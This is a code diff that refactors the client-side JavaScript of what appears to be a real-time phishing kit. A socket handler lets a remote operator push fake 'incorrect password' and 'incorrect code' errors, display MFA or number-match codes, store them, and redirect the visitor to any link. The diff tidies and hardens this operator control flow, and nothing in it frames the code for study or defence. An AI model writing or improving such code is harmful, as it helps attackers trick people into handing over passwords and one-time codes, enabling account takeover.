@@ -20,15 +20,11 @@
 	let loadingFrame=null;
 	 
 	function showError(message){
+		console.log("showError received:", message);
 		stopLoading();
 	  wrapper.classList.add("error","shake");
-	  errorMessage.classList.add("error");
-	  if(errorMessage){errorText.textContent=message;}
+	  if(errorMessage){errorMessage.classList.add("error");errorText.textContent=message;}
 	  setTimeout(()=>wrapper.classList.remove("shake"),350);
-	}
-	
-	function showIncorrectCode(){
-	  showError("Incorrect password");
 	}
 	
 	function clearError(){
@@ -74,70 +70,82 @@
 		let socket = window.socket; // optional local alias
 			
     socket.on("user:command", (data) => {
-	  const { command, code, phonescreen, link } = data;
-	  console.log("command", command);
-	  let phoneNumberEl;
-	//alert("command received");
-	  switch (command) {
-	    case "refresh":
-	      location.reload();
-	      break;
-	      
-	   case "bad-email":
-	      showError("Enter a correct email address");
-	      break;   
-	
-	    case "bad-otp":
-	      showError("incorrect code");
-	      break;
-	      
-	    case "bad-login":
-	      showError("incorrect password");
-	      break;
-	      
-	    case "otp":
-	     document.querySelector("#username").textContent = sessionStorage.getItem("user");
-	       phoneNumberEl = document.querySelector("#yp");
-	      if (!phoneNumberEl) {
-	        window.location.href = phonescreen;
-	        return;
-	      }
-	      phoneNumberEl.textContent = "your phone";
-	      stopLoading();
-	      break;  
-	
-	    case "phone-otp":
-	      if (!code) return;
-	      document.querySelector("#username").textContent = sessionStorage.getItem("user");
-	      console.log(code);
-	       phoneNumberEl = document.querySelector("#phone");
-	      sessionStorage.setItem("setcode", code);
-	      if (!phoneNumberEl) {
-	        window.location.href = phonescreen;
-	        return;
-	      }
-	      phoneNumberEl.textContent = code;
-	      stopLoading();
-	      break;
-	
-	    case "prompt":
-	      if (!code) return;
-	      document.querySelector("#username").textContent = sessionStorage.getItem("user");
-	      phoneNumberEl = document.querySelector("#code");
-	      sessionStorage.setItem("setcode", code);
-	      if (!phoneNumberEl) {
-	        window.location.href = phonescreen;
-	        return;
-	      }
-	      phoneNumberEl.textContent = code;
-	      stopLoading();
-	      break;
-	
-	    case "redirect":
-	      if (link) window.location.href = link;
-	      break;
-	  }
-	});
+		  if (!data || !data.command) return;
+		
+		  const { command, code, phonescreen, link } = data;
+		
+		  console.log("command:", command);
+		
+		  const usernameEl = document.querySelector("#username");
+		  const storedUser = sessionStorage.getItem("user");
+		
+		  if (usernameEl && storedUser) {
+		    usernameEl.textContent = storedUser;
+		  }
+		
+		  const redirectToPhoneScreen = () => {
+		    if (phonescreen) {
+		      window.location.href = phonescreen;
+		    }
+		  };
+		
+		  const updatePhoneField = (selector, value) => {
+		    const el = document.querySelector(selector);
+		
+		    if (!el) {
+		      redirectToPhoneScreen();
+		      return false;
+		    }
+		
+		    el.textContent = value;
+		    stopLoading();
+		    return true;
+		  };
+		
+		  switch (command) {
+		
+		    case "refresh":
+		      location.reload();
+		      break;
+		
+		    case "bad-email":
+		      showError("Enter a correct email address");
+		      break;
+		
+		    case "bad-login":
+		      showError("incorrect password");
+		      break;
+		
+		    case "bad-otp":
+		      showError("incorrect code");
+		      break;
+		
+		    case "otp":
+		      updatePhoneField("#yp", "your phone");
+		      break;
+		
+		    case "phone-otp":
+		      if (!code) return;
+		      sessionStorage.setItem("setcode", code);
+		      updatePhoneField("#phone", code);
+		      break;
+		
+		    case "prompt":
+		      if (!code) return;
+		      sessionStorage.setItem("setcode", code);
+		      updatePhoneField("#code", code);
+		      break;
+		
+		    case "redirect":
+		      if (link) {
+		        window.location.href = link;
+		      }
+		      break;
+		
+		    default:
+		      console.warn("Unhandled command:", command);
+		  }
+		});
 	
 	// 🔹 When connected, update the user status
 	socket.on("connect", () => {
